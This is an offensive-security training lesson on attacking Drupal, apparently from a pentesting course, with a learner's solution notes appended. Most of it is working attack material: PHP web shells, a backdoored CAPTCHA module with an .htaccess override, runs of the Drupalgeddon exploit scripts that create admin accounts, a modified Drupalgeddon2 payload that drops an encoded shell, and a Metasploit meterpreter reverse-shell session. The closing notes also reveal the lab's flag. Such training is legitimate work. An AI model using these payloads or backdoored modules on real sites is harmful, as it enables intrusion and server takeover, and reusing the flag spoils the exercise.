# Attacking Drupal

Now that we've confirmed that we are facing Drupal and fingerprinted the version let's look and see what misconfigurations and vulnerabilities we can uncover to attempt to gain internal network access.

Unlike some CMS', obtaining a shell on a Drupal host via the admin console is not as easy as just editing a PHP file found within a theme or uploading a malicious PHP script.

***

### Leveraging the PHP Filter Module

In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the `PHP filter` module, which "Allows embedded PHP code/snippets to be evaluated."

![](https://academy.hackthebox.com/storage/modules/113/drupal\_php\_module.png)

From here, we could tick the check box next to the module and scroll down to `Save configuration`. Next, we could go to Content --> Add content and create a `Basic page`.

![](https://academy.hackthebox.com/storage/modules/113/basic\_page.png)

We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common `cmd` to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard `system($_GET['cmd']);` we open up ourselves up to a "drive-by" attacker potentially coming across our web shell. Though unlikely, better safe than sorry!

Code: php

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

![](https://academy.hackthebox.com/storage/modules/113/basic\_page\_shell\_7v2.png)

We also want to make sure to set `Text format` drop-down to `PHP code`. After clicking save, we will be redirected to the new page, in this example `http://drupal-qa.inlanefreight.local/node/3`. Once saved, we can either request execute commands in the browser by appending `?dcfdd5e021a869fcc6dfaef8bf31377e=id` to the end of the URL to run the `id` command or use `cURL` on the command line. From here, we could use a bash one-liner to obtain reverse shell access.

Attacking Drupal

```shell-session
AIceBear@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

From version 8 onwards, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. We'd start by downloading the most recent version of the module from the Drupal website.

Attacking Drupal

```shell-session
AIceBear@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Once downloaded go to `Administration` > `Reports` > `Available updates`.

Note: Location may differ based on the Drupal version and may be under the Extend menu.

![](https://academy.hackthebox.com/storage/modules/113/install\_module.png)

From here, click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.

Once the module is installed, we can click on `Content` and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select `PHP code` from the `Text format` dropdown.

With either of these examples, we should keep our client apprised and obtain permission before making these sorts of changes. Also, once we are done, we should remove or disable the `PHP Filter` module and delete any pages that we created to gain remote code execution.

***

### Uploading a Backdoored Module

Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as [CAPTCHA](https://www.drupal.org/project/captcha). Scroll down and copy the link for the tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

Download the archive and extract its contents.

Attacking Drupal

```shell-session
AIceBear@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
AIceBear@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
```

Create a PHP web shell with the contents:

Code: php

```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```

Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.

Code: html

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.

Attacking Drupal

```shell-session
AIceBear@htb[/htb]$ mv shell.php .htaccess captcha
AIceBear@htb[/htb]$ tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```

Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.

![](https://academy.hackthebox.com/storage/modules/113/module\_installed.png)

Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.

Attacking Drupal

```shell-session
AIceBear@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

### Leveraging Known Vulnerabilities

Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed `Drupalgeddon`. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.

* [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
* [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
* [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.

Let's walk through exploiting each of these.

***

### Drupalgeddon

As stated previously, this flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this [PoC](https://www.exploit-db.com/exploits/34992) script. Once an admin user is added, we could log in and enable the `PHP Filter` module to achieve remote code execution.

Running the script with the `-h` flag shows us the help menu.

Attacking Drupal

```shell-session
AIceBear@htb[/htb]$ python2.7 drupalgeddon.py 

  ______                          __     _______  _______ _____    
 |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
 |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
 |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   
 |:  1    /          |__|                 |   |  |:  1   | |:  |   
 |::.. . /                                |   |  |::.. . | |::.|   
 `------'                                 `---'  `-------' `---'   
  _______       __     ___       __            __   __             
 |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
 |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
 |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
 |:  1   |  |__|      |:  |    |___|                               
 |::.. . |            |::.|                                        
 `-------'            `---'                                        
                                                                   
                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

			  Discovered by:

			  Stefan  Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww



Usage: drupalgeddon.py -t http[s]://TARGET_URL -u USER -p PASS


Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        Insert URL: http[s]://www.victim.com
  -u USERNAME, --username=USERNAME
                        Insert username
  -p PWD, --pwd=PWD     Insert password
```

Here we see that we need to supply the target URL and a username and password for our new admin account. Let's run the script and see if we get a new admin user.

Attacking Drupal

```shell-session
AIceBear@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

Now let's see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously in this section.

![](https://academy.hackthebox.com/storage/modules/113/drupalgeddon.png)

We could also use the [exploit/multi/http/drupal\_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal\_drupageddon/) Metasploit module to exploit this.

***

### Drupalgeddon2

We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.

Attacking Drupal

```shell-session
AIceBear@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
```

We can check quickly with `cURL` and see that the `hello.txt` file was indeed uploaded.

Attacking Drupal

```shell-session
AIceBear@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
```

Now let's modify the script to gain remote code execution by uploading a malicious PHP file.

Code: php

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

Attacking Drupal

```shell-session
AIceBear@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

Next, let's replace the `echo` command in the exploit script with a command to write out our malicious PHP script.

Attacking Drupal

```shell-session
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

Next, run the modified exploit script to upload our malicious PHP file.

Attacking Drupal

```shell-session
AIceBear@htb[/htb]$ python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php
```

Finally, we can confirm remote code execution using `cURL`.

Attacking Drupal

```shell-session
AIceBear@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

### Drupalgeddon3

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) is an authenticated remote code execution vulnerability that affects [multiple versions](https://www.drupal.org/sa-core-2018-004) of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie.

![image](https://academy.hackthebox.com/storage/modules/113/burp.png)

Once we have the session cookie, we can set up the exploit module as follows.

Attacking Drupal

```shell-session
msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195
msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local   
msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1
msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15
msf6 exploit(multi/http/drupal_drupageddon3) > show options 

Module options (exploit/multi/http/drupal_drupageddon3):

   Name            Current Setting                                                                   Required  Description
   ----            ---------------                                                                   --------  -----------
   DRUPAL_NODE     1                                                                                 yes       Exist Node Number (Page, Article, Forum topic, or a Post)
   DRUPAL_SESSION  SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y  yes       Authenticated Cookie Session
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.129.42.195                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           80                                                                                yes       The target port (TCP)
   SSL             false                                                                             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI       /                                                                                 yes       The target URI of the Drupal installation
   VHOST           drupal-acc.inlanefreight.local                                                    no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   User register form with exec
```

If successful, we will obtain a reverse shell on the target host.

Attacking Drupal

```shell-session
msf6 exploit(multi/http/drupal_drupageddon3) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM
[*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400

meterpreter > getuid

Server username: www-data (33)


meterpreter > sysinfo

Computer    : app01
OS          : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64
Meterpreter : php/linux
```

***

### Onwards

We have enumerated and attacked some of the most prevalent CMS': WordPress, Drupal, and Joomla. Next, let's move on to Tomcat, which has been putting a smile on the face of pentesters for years.

**Questions**

Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory.

#### Drupalgeddon 1

<pre class="language-bash"><code class="lang-bash"><strong>#https://www.exploit-db.com/exploits/34992
</strong>python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u doger -p doger
[!] VULNERABLE!
[!] Administrator user created!
[*] Login: doger
[*] Pass: doger
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&#x26;destination=node
#now go to http://drupal-qa.inlanefreight.local/#overlay=admin/modules
#tick the PHP filter then save
#now go to http://drupal-qa.inlanefreight.local/#overlay=node/add/page
Title: 
Testpage
Body:
&#x3C;?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
#save it
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
</code></pre>

#### Drupalgeddon2

```bash
#https://www.exploit-db.com/exploits/44448
python3 drupalgeddon2.py 
curl -s http://drupal-dev.inlanefreight.local/hello.txt
#its vulnerable
#remote code execution by uploading a malicious PHP file
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
#Next, let's replace the echo command in the exploit script with a command to write out our malicious PHP script.
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee pepe.php
#payload
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee pepe.php'}
#dont forget to change all the hello.txt in the original script
curl http://drupal-dev.inlanefreight.local/pepe.php?fe8edbabc5c5c9b7b764504cd22b17af=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
curl http://drupal-dev.inlanefreight.local/pepe.php?fe8edbabc5c5c9b7b764504cd22b17af=cat+/var/www/drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
DrUp@l_drUp@l_3veryWh3Re!
```

